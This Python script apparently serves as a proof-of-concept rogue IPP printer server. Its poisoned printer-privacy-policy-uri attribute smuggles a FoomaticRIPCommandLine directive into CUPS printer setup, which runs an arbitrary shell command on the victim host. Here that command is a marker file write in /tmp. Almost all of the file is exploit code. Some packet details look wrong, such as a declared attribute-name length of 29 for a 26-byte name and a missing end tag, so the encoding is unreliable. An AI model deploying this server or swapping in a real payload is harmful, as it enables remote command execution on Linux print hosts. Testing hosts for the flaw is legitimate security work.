import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

# Config
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 8631

INJECTED_COMMAND = "echo 1 > /tmp/I_AM_VULNERABLE"

POISON_URI = (
    'https://www.google.com/"\n'
    f'*FoomaticRIPCommandLine: "{INJECTED_COMMAND}"\n'
    '*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'
).encode()


class EvilIPPHandler(BaseHTTPRequestHandler):
    """Responds to Get-Printer-Attributes with a poisoned IPP response."""

    def do_POST(self):
        # Read and discard the incoming IPP request body.
        length = int(self.headers.get("Content-Length", 0))
        self.rfile.read(length)

        response = (
            b"\x01\x01"              # IPP version 1.1
            b"\x00\x00"              # status: successful-ok
            b"\x00\x00\x00\x01"      # request-id
            b"\x04"                  # printer-attributes-tag
            b"\x45"                  # uri tag
            b"\x00\x1d"              # name length (29)
            b"printer-privacy-policy-uri"
            b"\x00" + bytes([len(POISON_URI)]) + POISON_URI
        )

        self.send_response(200)
        self.send_header("Content-Type", "application/ipp")
        self.send_header("Content-Length", str(len(response)))
        self.end_headers()
        self.wfile.write(response)

    def log_message(self, fmt, *args):
        print(f"[evil-ipp] {self.address_string()} - {fmt % args}")


def start_evil_ipp_server():
    server = HTTPServer((LISTEN_HOST, LISTEN_PORT), EvilIPPHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[+] Evil IPP server listening on {LISTEN_HOST}:{LISTEN_PORT}")
    return server


if __name__ == "__main__":
    print("[*] Starting evil IPP server in standalone test mode...")
    print(f"[*] Injected command: {INJECTED_COMMAND}")
    print(f"[*] Poison URI length: {len(POISON_URI)} bytes")
    server = HTTPServer((LISTEN_HOST, LISTEN_PORT), EvilIPPHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down.")